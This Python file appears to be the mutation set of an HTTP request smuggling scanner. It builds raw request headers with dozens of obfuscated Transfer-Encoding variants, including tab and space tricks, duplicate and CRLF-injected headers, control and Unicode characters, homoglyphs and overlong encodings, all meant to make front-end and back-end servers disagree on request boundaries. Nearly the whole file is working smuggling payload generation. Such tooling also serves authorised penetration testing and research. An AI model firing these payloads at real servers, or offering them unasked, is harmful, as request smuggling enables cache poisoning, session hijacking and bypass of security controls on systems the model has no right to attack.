def render_template(gadget):
    RN = "\r\n"
    p = Payload()
    p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
    p.header += gadget + RN
    p.header += "Host: __HOST__" + RN
    p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
    p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
    p.header += "Content-Length: __REPLACE_CL__" + RN
    return p

# Existing mutations
mutations = {}

mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["spacejoin1"] = render_template("Transfer Encoding: chunked")
mutations["underjoin1"] = render_template("Transfer_Encoding: chunked")
mutations["smashed"] = render_template("Transfer Encoding:chunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
mutations["valueprefix1"] = render_template("Transfer-Encoding:  chunked")
mutations["vertprefix1"] = render_template("Transfer-Encoding:\u000Bchunked")
mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
mutations["contentEnc"] = render_template("Content-Encoding: chunked")
mutations["linewrapped1"] = render_template("Transfer-Encoding:\n chunked")
mutations["quoted"] = render_template("Transfer-Encoding: \"chunked\"")
mutations["aposed"] = render_template("Transfer-Encoding: 'chunked'")
mutations["lazygrep"] = render_template("Transfer-Encoding: chunk")
mutations["sarcasm"] = render_template("TrAnSFer-EnCODinG: cHuNkeD")
mutations["yelling"] = render_template("TRANSFER-ENCODING: CHUNKED")
mutations["0dsuffix"] = render_template("Transfer-Encoding: chunked\r")
mutations["tabsuffix"] = render_template("Transfer-Encoding: chunked\t")
mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["0dspam"] = render_template("Transfer\r-Encoding: chunked")
mutations["nested"] = render_template("Transfer-Encoding: cow chunked bar")
mutations["spaceFF"] = render_template("Transfer-Encoding:\xFFchunked")
mutations["accentCH"] = render_template("Transfer-Encoding: ch\x96nked")
mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")

# Add new mutations
mutations["param"] = render_template("Transfer-Encoding: chunked; foo=bar")
mutations["linefold_crlf"] = render_template("Transfer-Encoding:\r\n chunked")
mutations["nullsuffix"] = render_template("Transfer-Encoding: chunked\u0000")
mutations["urlencoded_name"] = render_template("Transfer%2DEncoding: chunked")
mutations["fake_header_value"] = render_template("X-Header: Transfer-Encoding: chunked")
mutations["mixedcase_value"] = render_template("Transfer-Encoding: ChuNked")
mutations["trailspace"] = render_template("Transfer-Encoding: chunked ")
mutations["duplicate_te"] = render_template("Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked")
mutations["junksuffix"] = render_template("Transfer-Encoding: chunkedblah")
mutations["duplicate_case_te"] = render_template("transfer-encoding: chunked\r\nTransfer-Encoding: chunked")
mutations["fake_cl"] = render_template("Transfer-Encoding: chunked\r\nContent-Length: 0")
mutations["te_gzip"] = render_template("Transfer-Encoding: gzip, chunked")
mutations["homoglyph_ch"] = render_template("Transfer-Encoding: ch\u0443nked")
mutations["multispace"] = render_template("Transfer-Encoding:    chunked")
mutations["multiline_tab"] = render_template("Transfer-Encoding:\t\r\n\tchunked")
mutations["misspelled"] = render_template("Transfer-EncodinX: chunked")
mutations["identity_comma"] = render_template("Transfer-Encoding: identity, chunked")
mutations["backslash"] = render_template("Transfer-Encoding: chunked\\")
mutations["parenthesis"] = render_template("Transfer-Encoding: chunked(evil)")
mutations["combo_encodings"] = render_template("Transfer-Encoding: \tchunked\u000B; foo=bar")

# Add control character mutations
control_chars = [
    "\r",  # Carriage return
    "\n",  # Line feed
    "\t",  # Tab
    "\0",  # Null byte
    "\x0B",  # Vertical tab
    "\x1C",  # File separator
    "\x1D",  # Group separator
    "\x1E",  # Record separator
    "\x1F",  # Unit separator
]

for char in control_chars:
    mutations[f"control-mid-{ord(char):02x}"] = render_template(f"Transfer-Encoding:{char}chunked")
    mutations[f"control-post-{ord(char):02x}"] = render_template(f"Transfer-Encoding{char}: chunked")
    mutations[f"control-pre-{ord(char):02x}"] = render_template(f"{char}Transfer-Encoding: chunked")
    mutations[f"control-end-{ord(char):02x}"] = render_template(f"Transfer-Encoding: chunked{char}")

# Add Unicode character mutations
unicode_chars = [
    0x00,  # Null byte
    0x0A,  # Line feed
    0x0D,  # Carriage return
    0x20,  # Space
    0xA0,  # Non-breaking space
    0x2028,  # Line separator
    0x2029,  # Paragraph separator
    0xFF,  # ÿ (extended ASCII)
    0x200B,  # Zero-width space
    0xFEFF,  # Byte order mark (BOM)
]

for char in unicode_chars:
    mutations[f"unicode-{char:04x}"] = render_template(f"Transfer-Encoding:{chr(char)}chunked")
    mutations[f"unicode-post-{char:04x}"] = render_template(f"Transfer-Encoding{chr(char)}: chunked")
    mutations[f"unicode-pre-{char:04x}"] = render_template(f"{chr(char)}Transfer-Encoding: chunked")
    mutations[f"unicode-end-{char:04x}"] = render_template(f"Transfer-Encoding: chunked{chr(char)}")

# Add overlong encoding mutations
overlong_sequences = [
    b"\xC0\xAF",  # Overlong forward slash (/)
    b"\xE0\x80\xAF",  # Another overlong forward slash
    b"\xF0\x80\x80\xAF",  # Yet another overlong forward slash
]

for seq in overlong_sequences:
    mutations[f"overlong-{seq.hex()}"] = render_template(f"Transfer-Encoding: {seq.decode('latin1')}chunked")

# Add repeated character mutations
repeated_chars = [
    " ",  # Multiple spaces
    "\t",  # Multiple tabs
    "\r\n",  # Multiple CRLFs
]

for char in repeated_chars:
    mutations[f"repeated-{char.encode('unicode_escape').decode()}"] = render_template(f"Transfer-Encoding:{char * 10}chunked")

# Add mixed encoding mutations
mixed_encodings = [
    "Transfer-Encoding: chu\x00nked",  # Null byte in value
    "Transfer-Encoding: chu\xFFnked",  # Extended ASCII in value
    "Transfer-Encoding: chu\xC3\xA9nked",  # UTF-8 in value
]

for encoding in mixed_encodings:
    mutations[f"mixed-{encoding.encode('unicode_escape').decode()}"] = render_template(encoding)

# Existing range-based mutations
for i in range(0x1, 0x20):
    mutations[f"midspace-{i:02x}"] = render_template(f"Transfer-Encoding:{chr(i)}chunked")
    mutations[f"postspace-{i:02x}"] = render_template(f"Transfer-Encoding{chr(i)}: chunked")
    mutations[f"prespace-{i:02x}"] = render_template(f"{chr(i)}Transfer-Encoding: chunked")
    mutations[f"endspace-{i:02x}"] = render_template(f"Transfer-Encoding: chunked{chr(i)}")

for i in range(0x7F, 0x100):
    mutations[f"midspace-{i:02x}"] = render_template(f"Transfer-Encoding:{chr(i)}chunked")
    mutations[f"postspace-{i:02x}"] = render_template(f"Transfer-Encoding{chr(i)}: chunked")
    mutations[f"prespace-{i:02x}"] = render_template(f"{chr(i)}Transfer-Encoding: chunked")
    mutations[f"endspace-{i:02x}"] = render_template(f"Transfer-Encoding: chunked{chr(i)}")
